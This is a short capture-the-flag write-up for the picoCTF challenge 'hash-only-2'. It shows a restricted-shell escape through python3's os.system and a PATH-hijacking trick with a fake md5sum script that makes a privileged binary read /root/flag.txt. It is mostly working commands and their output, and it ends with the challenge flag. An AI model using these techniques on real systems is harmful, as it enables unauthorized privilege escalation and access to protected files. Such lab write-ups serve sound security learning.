## hash-only-2

Okay this actually only took one ssh session to solve. Who knew not overthinking would such a good time saver...

First, I checked what we could / could not do. Maybe we could just re-use our last exploit.
```bash
ls -l
# total 0
```

Okay so nothing is in our directory. Can we do the funny PATH manipulation?
```bash
echo '#!/bin/bash' > ~/md5sum
# -rbash: /home/ctf-player/md5sum: restricted: cannot redirect output
```

No... we're in some restricted environment. Okay so we'll have to get creative.
I found this helpful [pdf](https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf) which outlined some common ways of getting around the restrictions.

As with all ubuntu based systems, python3 is pre-installed! We're able to get an unrestricted shell session by running
```python
import os
os.system("/bin/bash")
```

From there, I re-used the exploit from the last hash-only challenge.
```bash
ctf-player@challenge:~$ echo '#!/bin/bash' > ~/md5sum
ctf-player@challenge:~$ echo 'cat /root/flag.txt' >> ~/md5sum
ctf-player@challenge:~$ chmod +x ~/md5sum
ctf-player@challenge:~$ export PATH=~:$PATH
ctf-player@challenge:~$ flaghasher
Computing the MD5 hash of /root/flag.txt....

picoCTF{Co-@utH0r_Of_Sy5tem_b!n@riEs_797957c8}ctf-player@challenge:~$
```
